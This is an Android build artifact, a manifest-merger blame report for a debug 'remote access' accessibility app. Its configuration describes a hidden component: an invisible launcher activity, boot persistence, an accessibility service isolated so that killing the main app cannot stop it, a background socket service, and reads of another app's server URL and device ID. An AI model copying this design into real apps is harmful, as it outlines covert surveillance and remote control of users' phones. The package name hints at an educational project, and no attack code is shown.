accessibility-apk/app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.remoteaccess.accessibility"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="34" />
10
11    <uses-permission android:name="android.permission.INTERNET" />
11-->src/main/AndroidManifest.xml:5:5-67
11-->src/main/AndroidManifest.xml:5:22-64
12    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
12-->src/main/AndroidManifest.xml:6:5-79
12-->src/main/AndroidManifest.xml:6:22-76
13    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
13-->src/main/AndroidManifest.xml:7:5-77
13-->src/main/AndroidManifest.xml:7:22-74
14    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
14-->src/main/AndroidManifest.xml:8:5-87
14-->src/main/AndroidManifest.xml:8:22-84
15    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
15-->src/main/AndroidManifest.xml:9:5-81
15-->src/main/AndroidManifest.xml:9:22-78
16    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
16-->src/main/AndroidManifest.xml:10:5-95
16-->src/main/AndroidManifest.xml:10:22-92
17    <uses-permission android:name="android.permission.WAKE_LOCK" />
17-->src/main/AndroidManifest.xml:11:5-68
17-->src/main/AndroidManifest.xml:11:22-65
18    <uses-permission android:name="android.permission.VIBRATE" />
18-->src/main/AndroidManifest.xml:12:5-66
18-->src/main/AndroidManifest.xml:12:22-63
19    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
19-->src/main/AndroidManifest.xml:13:5-78
19-->src/main/AndroidManifest.xml:13:22-75
20    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
20-->src/main/AndroidManifest.xml:14:5-77
20-->src/main/AndroidManifest.xml:14:22-74
21    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
21-->src/main/AndroidManifest.xml:15:5-16:53
21-->src/main/AndroidManifest.xml:15:22-74
22
23    <!-- READ SharedPreferences of main app for server URL / device ID -->
24    <uses-permission android:name="com.remoteaccess.educational.permission.READ_PREFS" />
24-->src/main/AndroidManifest.xml:19:5-90
24-->src/main/AndroidManifest.xml:19:22-87
25
26    <permission
26-->[androidx.core:core:1.9.0] AndroidManifest.xml:22:5-24:47
27        android:name="com.remoteaccess.accessibility.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
27-->[androidx.core:core:1.9.0] AndroidManifest.xml:23:9-81
28        android:protectionLevel="signature" />
28-->[androidx.core:core:1.9.0] AndroidManifest.xml:24:9-44
29
30    <uses-permission android:name="com.remoteaccess.accessibility.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
30-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:5-97
30-->[androidx.core:core:1.9.0] AndroidManifest.xml:26:22-94
31
32    <application
32-->src/main/AndroidManifest.xml:21:5-79:19
33        android:allowBackup="false"
33-->src/main/AndroidManifest.xml:22:9-36
34        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
34-->[androidx.core:core:1.9.0] AndroidManifest.xml:28:18-86
35        android:debuggable="true"
36        android:extractNativeLibs="false"
37        android:icon="@android:drawable/ic_menu_manage"
37-->src/main/AndroidManifest.xml:23:9-56
38        android:label="Accessibility Service"
38-->src/main/AndroidManifest.xml:24:9-46
39        android:supportsRtl="true"
39-->src/main/AndroidManifest.xml:25:9-35
40        android:theme="@android:style/Theme.NoDisplay" >
40-->src/main/AndroidManifest.xml:26:9-55
41
42        <!-- Minimal config activity — invisible, no launcher icon -->
43        <activity
43-->src/main/AndroidManifest.xml:30:9-43:20
44            android:name="com.remoteaccess.accessibility.ConfigActivity"
44-->src/main/AndroidManifest.xml:31:13-43
45            android:exported="true"
45-->src/main/AndroidManifest.xml:32:13-36
46            android:launchMode="singleTop"
46-->src/main/AndroidManifest.xml:33:13-43
47            android:theme="@android:style/Theme.NoDisplay" >
47-->src/main/AndroidManifest.xml:34:13-59
48            <intent-filter>
48-->src/main/AndroidManifest.xml:35:13-38:29
49                <action android:name="android.intent.action.MAIN" />
49-->src/main/AndroidManifest.xml:36:17-69
49-->src/main/AndroidManifest.xml:36:25-66
50
51                <category android:name="android.intent.category.LAUNCHER" />
51-->src/main/AndroidManifest.xml:37:17-77
51-->src/main/AndroidManifest.xml:37:27-74
52            </intent-filter>
53            <intent-filter>
53-->src/main/AndroidManifest.xml:39:13-42:29
54                <action android:name="com.remoteaccess.accessibility.CONFIGURE" />
54-->src/main/AndroidManifest.xml:40:17-83
54-->src/main/AndroidManifest.xml:40:25-80
55
56                <category android:name="android.intent.category.DEFAULT" />
56-->src/main/AndroidManifest.xml:41:17-76
56-->src/main/AndroidManifest.xml:41:27-73
57            </intent-filter>
58        </activity>
59
60        <!-- Boot receiver to restart connectivity after reboot -->
61        <receiver
61-->src/main/AndroidManifest.xml:46:9-53:20
62            android:name="com.remoteaccess.accessibility.BootReceiver"
62-->src/main/AndroidManifest.xml:47:13-41
63            android:exported="true" >
63-->src/main/AndroidManifest.xml:48:13-36
64            <intent-filter>
64-->src/main/AndroidManifest.xml:49:13-52:29
65                <action android:name="android.intent.action.BOOT_COMPLETED" />
65-->src/main/AndroidManifest.xml:50:17-79
65-->src/main/AndroidManifest.xml:50:25-76
66                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
66-->src/main/AndroidManifest.xml:51:17-84
66-->src/main/AndroidManifest.xml:51:25-81
67            </intent-filter>
68        </receiver>
69
70        <!--
71            Standalone Accessibility Service — lives in a separate process so
72            killing the main app CANNOT crash this service.
73        -->
74        <service
74-->src/main/AndroidManifest.xml:59:9-70:19
75            android:name="com.remoteaccess.accessibility.StandaloneAccessibilityService"
75-->src/main/AndroidManifest.xml:60:13-59
76            android:exported="false"
76-->src/main/AndroidManifest.xml:62:13-37
77            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
77-->src/main/AndroidManifest.xml:61:13-79
78            android:process=":accessibility" >
78-->src/main/AndroidManifest.xml:63:13-45
79            <intent-filter>
79-->src/main/AndroidManifest.xml:64:13-66:29
80                <action android:name="android.accessibilityservice.AccessibilityService" />
80-->src/main/AndroidManifest.xml:65:17-92
80-->src/main/AndroidManifest.xml:65:25-89
81            </intent-filter>
82
83            <meta-data
83-->src/main/AndroidManifest.xml:67:13-69:72
84                android:name="android.accessibilityservice"
84-->src/main/AndroidManifest.xml:68:17-60
85                android:resource="@xml/accessibility_service_config" />
85-->src/main/AndroidManifest.xml:69:17-69
86        </service>
87
88        <!-- Background socket connector service -->
89        <service
89-->src/main/AndroidManifest.xml:73:9-77:48
90            android:name="com.remoteaccess.accessibility.SocketService"
90-->src/main/AndroidManifest.xml:74:13-42
91            android:exported="false"
91-->src/main/AndroidManifest.xml:75:13-37
92            android:foregroundServiceType="dataSync"
92-->src/main/AndroidManifest.xml:76:13-53
93            android:process=":accessibility" />
93-->src/main/AndroidManifest.xml:77:13-45
94
95        <provider
95-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
96            android:name="androidx.startup.InitializationProvider"
96-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
97            android:authorities="com.remoteaccess.accessibility.androidx-startup"
97-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
98            android:exported="false" >
98-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
99            <meta-data
99-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
100                android:name="androidx.emoji2.text.EmojiCompatInitializer"
100-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
101                android:value="androidx.startup" />
101-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
102            <meta-data
102-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
103                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
103-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
104                android:value="androidx.startup" />
104-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
105            <meta-data
105-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
106                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
106-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
107                android:value="androidx.startup" />
107-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
108        </provider>
109
110        <receiver
110-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
111            android:name="androidx.profileinstaller.ProfileInstallReceiver"
111-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
112            android:directBootAware="false"
112-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
113            android:enabled="true"
113-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
114            android:exported="true"
114-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
115            android:permission="android.permission.DUMP" >
115-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
116            <intent-filter>
116-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
117                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
117-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
117-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
118            </intent-filter>
119            <intent-filter>
119-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
120                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
120-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
120-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
121            </intent-filter>
122            <intent-filter>
122-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
123                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
123-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
123-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
124            </intent-filter>
125            <intent-filter>
125-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
126                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
126-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
126-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
127            </intent-filter>
128        </receiver>
129    </application>
130
131</manifest>